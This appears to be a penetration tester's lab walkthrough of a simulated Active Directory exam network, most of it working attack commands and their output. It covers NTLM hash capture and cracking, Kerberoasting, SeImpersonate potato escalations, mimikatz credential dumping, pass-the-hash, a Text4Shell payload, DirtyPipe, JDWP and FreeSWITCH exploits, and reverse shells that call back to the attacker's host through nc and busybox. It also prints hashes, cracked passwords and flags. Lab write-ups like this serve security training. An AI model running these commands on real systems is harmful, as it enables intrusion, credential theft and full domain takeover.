
## Enumeration

```bash
# Port discovery
sudo nmap -p- -sS -sV -sC -Pn -iL info/targets.txt --open -oN nmap/targets.nmap

# Do a UDP scan on most common targets (Covers 50% of most commonly used UDP ports)
sudo nmap -sU --max-scan-delay 10ms --max-retries 1 --max-rtt-timeout 200ms  --top-ports 1075 <target>

```


## .147
```bash

# Found multiple web servers
# Port 8080 seems most intresting
# Add hostnane to /etc/hosts
# Visit the site
http://ms01.oscp.exam:8080

# Some form of form that lets you connect to an URL
# Possible to connect back to our own host
# Was lost on what to do here

# Apperantly you can host your own SMB server and make the web server auth to it
impacket-smbserver test . -smb2support

# insert in to URL form field
\\192.168.45.216\test\test3

# Check SMB server for request
	web_svc::OSCP:aaaaaaaaaaaaaaaa:6867aeb6f83ea60a2638d827e22a6b09:010100000000000080ce9431a3e8da0123dd574d59e6727e0000000001001000700052004e007000480048006600740003001000700052004e0070004800480066007400020010006d00530053007600620079004d006b00040010006d00530053007600620079004d006b000700080080ce9431a3e8da0106000400020000000800300030000000000000000000000000300000fe5d504c831d09e971c2780dc7ed5359043fcd2c79c9474d8535d93f2fa1205a0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310036000000000000000000

# Crack the password
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	Diamond1

# Spray the password
netexec ssh 192.168.214.147 -u web_svc -p Diamond1

# SSH
ssh web_svc@192.168.158.147
whoami  
	oscp\web_svc
	
# Run winpeas and enumerate
# Nothing of interest

# Do AD enumeration and attacks
# Not possible to use impacket for kerberoast and AS-REP roast
# Use rubeus instead
.\Rubeus.exe kerberoast
sql_svc
$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$0B2C4AB75D32799D1FD7B4FC2ADCCD4A$41D113A2BE20AC485541DD1E26EFC9A791DC0C4AEF4BFD9FF33C00D6547ED7B3E26C9713E1235EAABF3BBAD3DEAEB6FCC3FF149B6171B9BB7A019CF0C53D5D8C626E0572049F5F524AB7EB93DB6A804131A0C18E2136B7F6D1445EE520777037501698B4EDEB5CEC6F051CA1F4F663ECBCB921B4A01BA018012D283223A82D8A4D5931ADF99C8861D050B88EA9B779E467EA38A2D7CBF02A114F9E2CE7C10CEA1AA3C05836DFEAC6F7EEC87DF0CE75CAD6A225ABCF41ADFF364CD734AEFC6E2341A24117DE2670BC4377D74DDA3A0FA10B07923FF261F10F100926ED9C52A1ABF193144A40CD2D31F70C9A2069114DF12D045413F2B2761CED2CA5F91E40F45B989E5E1FE94BC4BC363F9C80385F5D28BEF9255C26DBE9869A93C8313B3F0AE48AFB174856EAF1A34BBA10874222AF9FE4B4E1278397DD90

# Crack the password
hashcat -h | grep -i kerb
	13100 | Kerberos 5, etype 23, TGS-REP  

hashcat -m 13100 sql_svc /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Not possible to crack the password

# When gaining a remote shell to the same user by uploading a revshell to the ftp server and visit the file through the web app we suddenly have the SeImpersonatePrivilege enabled
# Was not enabled with ssh

whoami
	oscp\web_svc
whoami /priv
	SeImpersonatePrivilege	Enabled

# Use SweetPotato
.\sweetpotato.exe -a "C:\users\Mary.williams\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.216 1234"
whoami
	nt authority\system
	
# Set up chisel instead of ligolo (FW seems to block things)
# Kali
1. ./chisel server -p 8080 --reverse
4. proxychains evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd

# Tagret
2. iwr 192.168.45.216:80/chisel.exe -outfile chisel.exe
3. .\chisel.exe client 192.168.45.216:8080 R:socks 

# Tried cracking the sql_svc again, problem was formating of the hash, requires to use rubeus with /nowrap to skip newlines
# Or use impacket-GetUserSPNs instead
# As shown below the whole hash was not printed previous
proxychains impacket-GetUserSPNs -dc-ip 10.10.174.146 -request -outputfile hashes.asreproast oscp.exam/web_svc
cat hashes.asreproast
$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$175271b5f0c60eac44aa1f04ff1e955f$1599cbe9073d3277161bbeb78de6f7ff3bcbb9c7340126b296689afbd3db3bbe90f94824ba71bd3dc6951e6bae27f4265dbdafbd0fc62ee03e63167dd9df35a08e58e5e0e7e1e24e84ad8eb86ced5c41261844489d8d25b16c09ed0b4387848b9556a27531948f56f33ad9d999e287d473506b74be3c6121c70536c5c5632045439ade1ac2cfbd1ebd37e158f25fed28fd448b0c79cd17dcb69183011ee17ae03e360aecc24b2042efa9c7d816516db87feb00d27a1ce64512d87289001e86f7a49ffab026f0597f5325503d2bfba8a6d6fdb91c93c9b164359eae90e847b1ef18f5a2e8d9d1d90582eb4e2bda911b8eec6a92d14e4bbb6dde7eae0cb6432098677ce9e5bddc8bd7b501132ed586fac243cc2e7d7cf5950746a922b3dddcf77e681ff3aff0a124271ae9b86f5594172affa00eece2354063cd75a46beae650a0514cddcbf765f6ed9a525e9b0c2c4797d6f8593168707595b70316e8182c5bee6c96c52435496c9a70517c2dbf86060f7f62ad14bd01c861a546c10287ffff0473b6c7902cde3c0ef39020563370143c0cd98fd286b54ab988c9dbcb4ef89fa590d482b8f4ad990b48e0d010d13a62259ae90f74a5e39091d7752ebd315d99d21f94cc019869f653429742a3ea753b36a3c0f497c672cc47470e345ee689142d95c83d90e0e8016c64b3428725d0aae80b88a68e3f977149ea27d092c74aaa97f73decdb7509c45318874614be289c86e5e2ae7c26a12b78991fdc324c54ca9d50a4b496069f4ffc6ccf97e5aa30e387cb480e6515ebcc2517448bc7dda29d47937b571a2ca9472e9b2b0dd85a7c930eb4d405ad383e52f0b8eb43148ecdf88354300f5463fea29354d2a35d1c19dd4d5c4fa5f0a725626f043bc350e1180db6c40a24029f890724fd69e7419ed4b04c4ace2444fc1e6c8cde392b0a9755c5329fe58a10a780939404fda85c8afa11519bdffef71ec1bc9f51535746be3fd7050d0fdac11c416c89023ac121f4ccab276ede2e62409c065802832ea4fa962d90d937e1abff9245e6d931c36a5bd78f3e745019ec0f8e559917f9f2ff12480b9885031b0d49be7642a8e33ce120d5c4f719664a4f000acac14ac5569f270ea4b686cee959f64b54935701bbc6729c728fde07b4571f414902859afc20996c75d939778c9355cc979f17d15f0a7b85014ea128a833f63ea13f488575c339e5b97eb9f5ddc7b4b3f8c6bd86b3dc400ce006df7c9939fa128d4296853e5dfa4f6e64c4d009d7d7264a9c8f9cb871a26f9ba52ccd5f7cbeb6f7c280ad2a4a9d93aa70bd6565491e0fa96ebd6e21822b336ee1c6fd18128a0e9bed08aadf7e4decfacf8e9973888ab81dedc67c4205da3ad40a0127cf3bb1523b688a4e6cf8f5feace139

# Crack the hash
hashcat -m 13100 crack/sql_svc /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	Dolphin1
	
# Spray the services
proxychains netexec mssql 10.10.174.148 -u sql_svc -p Dolphin1 --continue-on-success
MSSQL    10.10.174.148   1433   MS02 oscp.exam\sql_svc:Dolphin1 (Pwn3d!)

# Connect to the MSSQL server
proxychains impacket-mssqlclient sql_svc:'Dolphin1'@10.10.174.148 -windows-auth
help
	enable_xp_cmdshell

# Create a revshell payload for powershell (base64)
# Struggled to connect to the host since I am using ssh port forwarding and proxychain
# Solved it by connecting to the 10.10.174.147 machine instead which had nc.exe
ssh web_svc@192.168.214.147
PS C:\Users\web_svc> .\nc.exe -nvlp 5555
xp_cmdshell powershell -e JAB...

```


## .148

```bash

whoami /priv
	SeImpersonatePrivilege		Enabled

# Need to somehow transfer sweetpotato from .147 --> .148
# Should be able to use the web server on .147 and upload sweetpotato to it through ftp and download on .148
# Server crasched
# Dumb idea! hostname can't be resolved
# Instead use netexec mssql to upload files: sweepotato.exe, nc.exe, mimikatz.exe, winpeas.exe 
proxychains netexec mssql 10.10.118.148 -u sql_svc -p 'Dolphin1' --put-file ./sweetpotato.exe C:\\Users\\Public\\sweetpotato.exe

# Run sweetpotato
.147> .\nc.exe -nvlp 1122
.\sweetpotato.exe -a "C:\users\public\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.118.147 1122"
whoami
	nt authority\system
ipconfig
	10.10.118.148

# Run mimikatz.exe
sekurlsa::logonpasswords
lsadump::sam
# Found 2 hashes for Administrator
	Administrator:507e8b20766f720619e9f33d73756b34
	Administrator:59b280ba707d22e3ef0aa587fc29ffe5
	
# Not possible to crack
# Spray the hashes for the DC
proxychains netexec smb 10.10.118.146 -u info/usernames.txt -H 59b280ba707d22e3ef0aa587fc29ffe5
	SMB   10.10.118.146   445    DC01  oscp.exam\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)

# Domain PWNED


```

## .146

```bash

# Pass the hash
proxychains impacket-psexec Administrator@10.10.118.146 -hashes 00000000000000000000000000000000:59b280ba707d22e3ef0aa587fc29ffe5

whoami
	nt authority\system
ipconfig
	10.10.118.146

# Domain PWNED

```

## .149

```bash

# Port 80
# Checked exploits for apache 2.4 but did not work
50383.sh 

# Tried to FUZZ for directory but no hits

# SNMP open
# Try SNMPWalk (Adding the . will catch weird formated shit in SNMP)
# Also use snmpbulkwalk, much faster
# Bruteforce the community string
python3 snmpbrute.py -t 192.168.214.145 -f /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt

snmpbulkwalk -Cr1000 -c public -v2c 192.168.158.149 . > info/snmpwalk.149

# Grep for intresting strings
cat info/snmpwalk.149.v2c | grep -i string
cat info/snmpwalk.149.v2c | grep -i pass
cat info/snmpwalk.149.v2c | grep -i user
	STRING: ./home/john/RESET_PASSWD
	STRING: Resetting password of kiero to the default value

# Found 2 users, add to /info

# Try to bruteforce the password to ftp and ssh
# Seems like the target is FTP given the error msg shows kiero is a valid user
FTP         192.168.158.149 21     192.168.158.149  [-] kiero:123456 (Response:530 Login incorrect.)
FTP         192.168.158.149 21     192.168.158.149  [-] john:123456 (Response:530 Permission denied.)

netexec ftp 192.168.158.149 -u kiero -p /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt

# Did not work, but worked with password:kiero
# Remeber to always try the username!!

# Check the FTP file share
ftp 192.168.158.149
	kiero:kiero
	
# Download private keys
mget id_rsa*

# Spray the ssh login
# Tried to manually log in with the keys and john worked
# For other combinations it asked for passwords (Try to crack it)
ssh john@192.168.158.149 -i info/id_rsa

# Try to crack the other ssh key
ssh2john id_rsa_2
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_2.hash

# Run linpeas
SUID
	/home/john/RESET_PASSWD (Unknown SUID binary!)

SGID
	/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
# Found nothing of real interest

# Check kernel version and possible exploits
cat /etc/issue
	Ubuntu 20.04.5 LTS \n \l
uname -r
	5.9.0-050900-generic
	
searchsploit ubuntu 5.9
	Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escala
	https://www.exploit-db.com/exploits/41760
	
# Try to exploit the kernel
who am I
	john     pts/0        2024-08-08 12:21 (192.168.45.162)
# Seems to be vulnerable

# Create the payload file
nano UserNamespaceExec.c

# Compile the payload on the target system to match the kernel
gcc -version
	gcc: error: unrecognized command line option ‘-version’
find / -name *gcc* 2>/dev/null
	/usr/bin/gcc-9
/usr/bin/gcc-9 -o UserNamespaceExec UserNamespaceExec.c
./UserNamespaceExec -- /bin/bash
	Setting uid map in /proc/46133/uid_map
	Setting gid map in /proc/46133/gid_map
whoami
	root

# Says I am root but cant cat the proof.txt
cat /root/proof.txt
	cat: /root/proof.txt: Permission denied

# Continue with the instructions of the exploit
# Dead end does not seem to work!

# Check exploits suggested by linpeas!!!
# Tried to use searchsploit and grep but get way to many result
searchsploit "linux kernel Local Privilege Escalation"   | grep  "5." | grep -v " < 5.15" | grep "5.9"
# Maybe worth to try for the specific kernel version and try 1-5 numbers under and over E.g.
searchsploit "linux kernel Local Privilege Escalation dirty"   | grep  "5.9"
searchsploit "linux kernel Local Privilege Escalation dirty"   | grep  "5.8"
Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)

# Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
nano dirtypipes.c
gcc-9 -o dirtypipez dirtypipes.c 
./dirtypipez
whoami
	root
cat /root/proof.txt
	d6c3d374e7080604581207dfe8061688


```

## .150

```bash

# Port 8080
# FUZZ for directories
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.228.150:8080/FUZZ/
# Found dir /CHANGELOG
	Added Apache Commons Text 1.8 Dependency for String Interpolation Version 0.1

# Google for exploit of service
https://www.logpoint.com/en/blog/text4shell-detecting-exploitation-of-cve-2022-42889/

# Attack following URL
http://192.168.228.150:8080/search?query=<insert payload>
# First tired pinging back to my host
$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec(%27ping%20-c%205%20192.168.45.210%27)%7D
sudo tcpdump -i tun0 icmp -v
# Pings sucessfull

# Insert reverse shell to payload
# Used https://www.revshells.com/ to generate multiple revshells
# Found working
nc -nvlp 1234
busybox nc 192.168.45.210 1234 -e sh
# Requires URL encoding (Burp)
http://192.168.228.150:8080//search?query=%24%7b%73%63%72%...

# Inside
whoami
	dev
cat local.txt
	5d7e828bb8e5abc3945f710c203f3c64
	
# Stabalize the shell
# Tried to run another msfvenom shell but did not work
# Stabalize with python
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
	
# Run linpeas
Running local webserver
	127.0.0.1:8000

# Had major issues with port forwarding
# What did work was following
1. Kali> ./chisel server -p 9000 --reverse
# Forward port 8000 --> 8000
# Tried to use my documented command chisel client 192.168.45.185:8008 R:socks (Did not work!)
# Specifing the IP and port did work
2. Target> ./chisel client 192.168.45.210:9000 R:8000:127.0.0.1:8000

# Now we can scan the port
sudo nmap -p 8000 -sS -sV -sC -Pn 127.0.0.1
8000/tcp open  jdwp
# Exploit for jdwp
https://github.com/IOActive/jdwp-shellifier

# Run jdwp exploit
kali> nc -nvlp 5555
kali> python3 jdwp.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.45.210 5555 -e /bin/bash'
	client: Connected (Latency 42.257306ms)
	Go triggering the corresponding ServerSocket (e.g., 'nc ip 5000 -z')

# Open second shell on target and run the nc command
target> nc 127.0.0.1 5000 -z
# Check back on the nc instance on kali
whoami
	root
cat root/proof.txt
	27029205000218f4b895a08c54cdf6c5



```


## .151

```bash

# Windows machine

# nmap shows service
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
https://www.exploit-db.com/exploits/47799

# Run the exploit with a revshell payload
nc -nvlp 1234
python3 47799 192.168.228.151 "powershell -e JABjAGwAaQ..."
whoami
	oscp\chris
cat local.txt
	61044977ea19dcd7369cc96b77d443f9
	
# Run godpotato (Tried sweetpotato but did not work)
whoami /priv
	SeImpersonatePrivilege		Enabled
./godpotato.exe -cmd "C:\users\chris\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.216 1234"

# Try to find another PE path
# Run winpeas
.\winpeas.exe
	
	Possible DLL Hijacking folder: C:\Program Files\FreeSWITCH (chris [AllAccess])
	
	C:\program files\Kite\KiteService.exe	No quotes and Space detected
	Possible DLL Hijacking in binary folder: C:\program files\Kite (chris [WriteData/CreateFiles])
	
	LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
	
# Check if you have write access to any of the folders
# Have write acces to kiteservice
mv KiteService.exe KiteService.old
iwr 192.168.45.210:80/revshell2.exe -outfile
nc -nvlp 1122
stop-service KiteService
startservice KiteService
whoami
	nt authority\system
	



```